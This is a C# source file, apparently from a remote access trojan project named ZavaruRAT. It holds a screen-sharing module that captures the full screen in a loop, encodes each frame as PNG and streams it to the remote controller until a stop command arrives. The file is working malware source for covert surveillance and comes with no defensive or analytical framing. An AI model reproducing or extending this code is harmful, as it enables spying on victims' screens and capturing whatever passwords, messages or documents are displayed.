#region

using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using ZavaruRAT.Client.Sdk;
using ZavaruRAT.Shared.Models.Client;

#endregion

namespace ZavaruRAT.Client.Modules;

public sealed class ScreenShareModule : ModuleBase
{
    public async Task<RealTimeExecutionResult> ScreenCapture()
    {
        while (true)
        {
            var screen = TakeScreenshot();
            try
            {
                await Context.Client.SendAsync(new CommandResult
                {
                    Status = CommandResultStatus.RealTime,
                    Result = screen
                });
            }
            catch
            {
                Debug.WriteLine("Unable to sent");
            }

            Debug.WriteLine("Sent screen");

            try
            {
                _ = await Context.Client.ReceiveAsync<Command>(50);
                break;
            }
            catch
            {
                // ignored
            }
        }

        return new RealTimeExecutionResult();
    }

    private static byte[] TakeScreenshot()
    {
        using var bitmap = new Bitmap(1920, 1080);
        using (var g = Graphics.FromImage(bitmap))
        {
            g.CopyFromScreen(0, 0, 0, 0,
                             bitmap.Size, CopyPixelOperation.SourceCopy);
        }

        using var ms = new MemoryStream();
        bitmap.Save(ms, ImageFormat.Png);

        return ms.ToArray();
    }
}
